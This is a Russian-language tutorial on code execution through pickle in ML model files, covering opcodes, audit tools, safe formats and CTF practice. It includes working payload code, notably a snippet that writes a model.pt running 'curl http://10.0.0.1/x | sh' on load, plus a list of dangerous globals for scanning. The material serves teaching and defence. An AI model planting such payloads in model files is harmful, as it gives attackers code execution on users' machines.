## Вопрос, с которого всё начинается

Ты скачал «модель» с хостинга, загрузил её — и получил выполнение кода. Никакой уязвимости в обучении не было: дело в формате хранения. **pickle** — это не просто данные, а инструкции по восстановлению объектов, и среди них может быть вызов произвольной функции. Разберём, как это работает.

## Наш пример: pickle как программа

`pickle.loads(data)` выполняет последовательность опкодов, которая восстанавливает объект. Один из опкодов, `REDUCE`, вызывает функцию с аргументами. Если в потоке записано «вызови `os.system` с `'...'`», при загрузке это исполнится.

## Шаг 1: как устроен pickle

Поток pickle — это байты-опкоды: `GLOBAL` (загрузить объект по имени), `REDUCE` (вызвать), `BUILD` (собрать), `STOP`. Комбинация `GLOBAL os.system` + `REDUCE` даёт вызов `os.system`. Поэтому загрузка недоверенного pickle равносильна запуску чужого кода.

## Шаг 2: почему это в моделях

Популярные библиотеки (PyTorch `.pt`/`.bin`, старый Keras `.h5` с лямбдами, `joblib`) используют pickle для сериализации весов и объектов. Когда ты делаешь `torch.load('model.pt')`, внутри может произойти `pickle.load`. Значит, недоверенный файл модели — это недоверенный код.

## Шаг 3: как выглядит атака

Злоумышленник публикует «популярную модель», внутри — pickle с `__reduce__`, возвращающим `(os.system, ('curl attacker|sh',))`. Жертва загружает модель — команда исполняется. Это классический supply-chain-вектор в ML.

## Шаг 4: безопасные альтернативы

- **safetensors** — формат только для тензоров, без исполняемого кода.
- **ONNX** — граф вычислений, без произвольных вызовов.
- **Загрузка с `weights_only=True`** в PyTorch (ограничивает типы).

Правило: не загружай pickle из недоверенного источника; предпочитай safetensors.

## Шаг 5: анализ подозрительной модели

Если модель нужно проверить, не загружая: поищи в файле строки `os`, `system`, `subprocess`, `eval`, `__reduce__`, `GLOBAL`. Инструменты вроде `picklescan`/`fickling` статически разбирают поток и находят опасные опкоды без выполнения. Это безопасный способ аудита.

## Шаг 6: в CTF

Задача может дать «модель», при загрузке которой срабатывает код, или попросить сконструировать pickle, который выполнит команду. Решение: понять опкоды, собрать поток с `GLOBAL`+`REDUCE`, проверить, что цель действительно исполняет pickle.

## Если не сработало

- Код не исполняется → формат не pickle (проверь магию/строки).
- Загрузчик ограничен (`weights_only`) → нужен другой путь.
- Файл «не читается» → возможно, это safetensors; там RCE нет.

## Частые ошибки

- Считать, что «данные» безопасны.
- Загружать модели из интернета без проверки.
- Путать pickle и safetensors.

## Что мы теперь знаем

- pickle — это поток опкодов, включая вызовы функций.
- Многие форматы моделей используют pickle внутри.
- Недоверенная модель = недоверенный код.
- safetensors/ONNX безопаснее; pickle можно анализировать статически.

## Шаг 7: как читать поток pickle

Поток начинается с опкодов: `\x80` (PROTO), затем `c` (GLOBAL) с именем модуля и объекта, `(` (MARK), `R` (REDUCE), `.` (STOP). Для аудита полезно «дизассемблировать» поток: `pickletools.dis(data)` печатает опкоды человекочитаемо. Так ты видишь, какие модули и функции упоминаются, не выполняя файл. Это первый шаг любой проверки модели.

## Шаг 8: конструирование payload

Классический приём: класс с методом `__reduce__`, возвращающим пару `(callable, args)`. При загрузке pickle вызовет `callable(*args)`. Пример: `(os.system, ('id',))`. Так строятся payload'ы и для CTF, и для демонстрации угрозы. Главное — помнить, что это код, а не данные.

## Шаг 9: где именно прячется pickle

- PyTorch `.pt`/`.pth`/`.bin` — исторически pickle.
- Keras `.h5` со `Lambda`-слоями.
- `joblib.dump`/`load` — pickle.
- `numpy.save` с `allow_pickle=True` — pickle.
- Некоторые `.onnx` с кастомными операторами (реже).

Перед загрузкой любого из них — проверка.

## Шаг 10: инструменты аудита

`picklescan` сканирует поток и сообщает об опасных глобалах. `fickling` умеет разбирать, деобфусцировать и даже «переписывать» поток. `bandit`/статические анализаторы ловят `pickle.load` в коде. Комбинация даёт надёжную проверку без выполнения.

## Шаг 11: безопасная практика

Правила: не загружай pickle из недоверенного источника; используй safetensors/ONNX; если нужно загрузить pickle — делай это в песочнице без сети и с минимальными правами; проверяй хеши и происхождение. Для своих моделей — сохраняй в safetensors.

## Шаг 12: мини-чек-лист

- Формат — pickle или safetensors?
- Есть ли `GLOBAL`/`REDUCE` в потоке?
- Прогнал ли статический сканер?
- Загружаешь в песочнице?
- Есть ли подпись/хеш происхождения?

## Шаг 13: итог

Модель — это не всегда «просто веса». Если внутри pickle, загрузка равносильна запуску кода. Поэтому правило простое: **не загружай недоверенный pickle**; предпочитай safetensors; проверяй статически. В CTF это значит: разбери поток, найди опасные опкоды, пойми, что выполнится. Помни: файл модели — это программа, если в нём pickle.

## Разбор потока: `pickletools.dis` на реальном payload

Соберём минимальный опасный pickle и посмотрим, из чего он состоит. Классический приём — класс с `__reduce__`, который при сериализации вернёт пару «функция + аргументы»:

```python
import pickle, os, pickletools

class Evil:
    def __reduce__(self):
        return (os.system, ('id',))

data = pickle.dumps(Evil())
print(data)
```

Поток (protocol 0) выглядит так:

```
b'cnt\nsystem\np0\n(Vid\np1\ntp2\nRp3\n.'
```

Разберём его дизассемблером — это безопасно, `pickletools.dis` ничего не исполняет:

```
$ python3 -c "import pickle,pickletools;pickletools.dis(open('evil.pkl','rb').read())"
    0: c    GLOBAL     'nt system'
   11: p    PUT        0
   14: (    MARK
   15: V        UNICODE  'id'
   19: p        PUT        1
   22: t        TUPLE   (MARK at 14)
   23: R    REDUCE
   24: p    PUT        3
   27: .    STOP
```

Читаем сверху вниз: `GLOBAL 'nt system'` — загрузить объект `system` из модуля `nt` (в Windows так называется `os`; на Linux было бы `posix system`). `MARK` открывает список аргументов, `UNICODE 'id'` кладёт строку, `TUPLE` собирает её в кортеж, а `REDUCE` **вызывает** `system('id')`. Всё это происходит в момент `pickle.loads`. Опкоды — это буквально программа; загрузка = выполнение.

## Справочная таблица: опасные опкоды и глобалы

| Опкод | Символ | Что делает | Почему опасен |
|---|---|---|---|
| GLOBAL | `c` | загружает объект `module name` | даёт доступ к любой функции |
| STACK_GLOBAL | `\x93` | то же, имя со стека | обфускация: имя собирается динамически |
| REDUCE | `R` | вызывает callable(*args) | точка исполнения кода |
| BUILD | `b` | вызывает `__setstate__` | исполняет пользовательский метод |
| INST | `i` | создаёт объект класса | может звать `__init__` |
| OBJ | `o` | собирает объект | комбинация с GLOBAL |
| EXT1/2/4 | `\x82..\x84` | глобал по номеру из реестра | прячет строку имени |

Опасные глобалы, которые чаще всего встречаются в malicious-моделях: `os.system`, `posix.system`, `subprocess.Popen`, `os.popen`, `builtins.eval`, `builtins.exec`, `runpy._run_code`, `pty.spawn`. Статический сканер ищет именно эти строки — они остаются в потоке в открытом виде, даже если опкод закодирован.

## Практика: собираем и проверяем payload в изоляции

Две стороны одной медали — собрать payload (для CTF) и обезвредить чужой (для защиты). Сборка:

```python
import pickle, os
class RCE:
    def __reduce__(self):
        return (os.system, ('curl http://10.0.0.1/x | sh',))
open('model.pt','wb').write(pickle.dumps(RCE()))
```

Проверка чужого файла без выполнения — три независимых инструмента:

```
$ pickletools -d suspect.pkl | grep -E 'GLOBAL|REDUCE|INST|STACK_GLOBAL'
$ pip install picklescan && picklescan -p suspect.pkl
$ pip install fickling  && fickling --check-safety suspect.pkl
```

`picklescan` вернёт список найденных «опасных» глобалов с severity; `fickling` дополнительно умеет деобфусцировать поток и переписать его в безопасный вид. Комбинация «дизассемблер + два сканера» даёт высокую уверенность: строки вида `os.system` не исчезают из потока при обычной обфускации, поэтому grep по декодированному дампу — быстрый первый фильтр.

## Граничные случаи и ограничения статического анализа

**Обфускация имён.** `STACK_GLOBAL` позволяет собрать имя функции из кусков на стеке — статический grep по строке `os.system` ничего не найдёт, хотя вызов есть. Поэтому `pickletools.dis` важнее, чем grep: он показывает итоговое `GLOBAL`/`REDUCE` независимо от того, как имя собиралось.

**Вложенный pickle.** Внутри одного потока может лежать `bytes` со **вторым** pickle, который загрузится позже в приложении. Сканер видит внешний поток и молчит. Лечится рекурсивным разбором всех `bytes`-полей.

**`weights_only=True` — не серебряная пуля.** Режим ограничивает набор разрешённых типов, но исторически в нём находили обходы (через `persistent_load` и кастомные unpickler'ы). Он снижает риск, а не устраняет его полностью — и работает только если его действительно включили.

**Разница между «опасный глобал» и «сработает».** Наличие `os.system` в потоке ещё не значит, что код исполнится: важен контекст загрузки. Но для недоверенного файла исходить надо из худшего: считать, что сработает.

**Загрузка ≠ единственный триггер.** Некоторые библиотеки вызывают `__reduce__`/`__setstate__` не в момент `load`, а позже — при первом использовании объекта. Тогда «проверил в песочнице и не увидел эффекта» не означает «безопасно».

**Ложная уверенность от safetensors.** safetensors хранит только тензоры и не содержит кода — это правда. Но путь к файлу, имя слоя, метаданные могут быть использованы в других атаках (path traversal при загрузке), так что «не pickle» не равно «доверяй вслепую».
